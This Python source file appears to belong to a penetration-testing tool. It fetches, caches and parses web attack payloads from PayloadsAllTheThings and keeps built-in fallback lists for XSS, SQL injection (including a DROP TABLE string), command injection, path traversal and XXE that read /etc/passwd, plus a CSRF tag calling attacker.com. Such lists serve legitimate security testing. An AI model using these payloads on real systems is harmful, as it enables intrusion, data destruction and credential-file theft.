import os
import json
import requests
from pathlib import Path
from typing import Dict, List
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class PayloadManager:
    """Manages payload fetching and caching from PayloadsAllTheThings"""
    
    PAYLOADS_REPO = "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master"
    CACHE_DIR = Path.home() / ".Epic-pentesting-tool" / "payloads"
    
    PAYLOAD_PATHS = {
        'xss': '/XSS%20Injection/README.md',
        'sql_injection': '/SQL%20Injection/README.md',
        'csrf': '/CSRF%20Injection/README.md',
        'xxe': '/XXE%20Injection/README.md',
        'ldap': '/LDAP%20Injection/README.md',
        'command_injection': '/Command%20Injection/README.md',
        'path_traversal': '/Path%20Traversal/README.md',
        'template_injection': '/Template%20Injection/README.md',
        'deserialization': '/Insecure%20Deserialization/README.md',
        'cors': '/CORS%20Misconfiguration/README.md',
        'crlf': '/CRLF%20Injection/README.md',
        'open_redirect': '/Open%20Redirect/README.md',
    }
    
    def __init__(self):
        self.cache_dir = self.CACHE_DIR
        self.cache_dir.mkdir(parents=True, exist_ok=True)
        self.payloads = {}
        self.load_cached_payloads()
    
    def load_cached_payloads(self):
        """Load payloads from local cache"""
        try:
            cache_file = self.cache_dir / "payloads_cache.json"
            if cache_file.exists():
                with open(cache_file, 'r') as f:
                    self.payloads = json.load(f)
                logger.info(f"Loaded {len(self.payloads)} cached payload types")
        except Exception as e:
            logger.error(f"Error loading cached payloads: {e}")
    
    def fetch_payloads(self, vuln_type: str) -> List[str]:
        """Fetch payloads for a specific vulnerability type"""
        if vuln_type in self.payloads:
            return self.payloads[vuln_type]
        
        if vuln_type not in self.PAYLOAD_PATHS:
            logger.warning(f"Unknown vulnerability type: {vuln_type}")
            return []
        
        try:
            url = self.PAYLOADS_REPO + self.PAYLOAD_PATHS[vuln_type]
            logger.info(f"Fetching payloads from: {url}")
            
            response = requests.get(url, timeout=10)
            response.raise_for_status()
            
            payloads = self._parse_payloads(response.text, vuln_type)
            self.payloads[vuln_type] = payloads
            self._save_cache()
            
            logger.info(f"Fetched {len(payloads)} payloads for {vuln_type}")
            return payloads
        
        except Exception as e:
            logger.error(f"Error fetching payloads for {vuln_type}: {e}")
            return self._get_default_payloads(vuln_type)
    
    def _parse_payloads(self, content: str, vuln_type: str) -> List[str]:
        """Parse payloads from markdown content"""
        payloads = []
        lines = content.split('\n')
        
        in_code_block = False
        current_payload = []
        
        for line in lines:
            if line.startswith('```'):
                if in_code_block:
                    if current_payload:
                        payload_text = '\n'.join(current_payload).strip()
                        if payload_text and len(payload_text) > 5:
                            payloads.append(payload_text)
                    current_payload = []
                in_code_block = not in_code_block
            elif in_code_block:
                current_payload.append(line)
        
        return payloads[:50]  # Limit to 50 payloads per type
    
    def _get_default_payloads(self, vuln_type: str) -> List[str]:
        """Get default payloads when fetch fails"""
        defaults = {
            'xss': [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                'javascript:alert("XSS")',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
            ],
            'sql_injection': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1/*",
                "admin' --",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "1; DROP TABLE users--",
                "' AND 1=1--",
            ],
            'csrf': [
                '<img src="http://attacker.com/csrf.php?action=transfer">',
                '<form action="http://target.com/transfer" method="POST"><input type="hidden" name="amount" value="1000"><input type="submit"></form>',
                '<iframe src="http://target.com/delete?id=1"></iframe>',
            ],
            'command_injection': [
                '; ls -la',
                '| whoami',
                '`whoami`',
                '$(whoami)',
                '& ipconfig',
                '&& cat /etc/passwd',
            ],
            'path_traversal': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
            ],
        }
        return defaults.get(vuln_type, [])
    
    def _save_cache(self):
        """Save payloads to local cache"""
        try:
            cache_file = self.cache_dir / "payloads_cache.json"
            with open(cache_file, 'w') as f:
                json.dump(self.payloads, f, indent=2)
            logger.info("Payloads cache saved")
        except Exception as e:
            logger.error(f"Error saving payloads cache: {e}")
    
    def get_all_payloads(self, vuln_type: str) -> Dict[str, any]:
        """Get all payloads for a vulnerability type with metadata"""
        payloads = self.fetch_payloads(vuln_type)
        return {
            'type': vuln_type,
            'count': len(payloads),
            'payloads': payloads,
        }
    
    def search_payloads(self, query: str) -> Dict[str, List[str]]:
        """Search payloads across all types"""
        results = {}
        query_lower = query.lower()
        
        for vuln_type in self.PAYLOAD_PATHS.keys():
            payloads = self.fetch_payloads(vuln_type)
            matching = [p for p in payloads if query_lower in p.lower()]
            if matching:
                results[vuln_type] = matching
        
        return results
    
    def get_payload_info(self, vuln_type: str) -> Dict:
        """Get detailed information about a vulnerability type"""
        info = {
            'xss': {
                'name': 'Cross-Site Scripting (XSS)',
                'severity': 'High',
                'description': 'Injection of malicious scripts into web pages',
                'impact': 'Session hijacking, credential theft, malware distribution',
            },
            'sql_injection': {
                'name': 'SQL Injection',
                'severity': 'Critical',
                'description': 'Injection of SQL commands into application queries',
                'impact': 'Database compromise, data theft, authentication bypass',
            },
            'csrf': {
                'name': 'Cross-Site Request Forgery',
                'severity': 'Medium',
                'description': 'Forcing users to perform unwanted actions',
                'impact': 'Unauthorized transactions, account compromise',
            },
            'command_injection': {
                'name': 'Command Injection',
                'severity': 'Critical',
                'description': 'Execution of arbitrary system commands',
                'impact': 'Complete system compromise, data theft, malware',
            },
            'path_traversal': {
                'name': 'Path Traversal',
                'severity': 'High',
                'description': 'Access to files outside intended directory',
                'impact': 'Sensitive file disclosure, configuration theft',
            },
            'xxe': {
                'name': 'XML External Entity (XXE)',
                'severity': 'High',
                'description': 'Processing of malicious XML entities',
                'impact': 'File disclosure, SSRF, DoS attacks',
            },
        }
        return info.get(vuln_type, {})
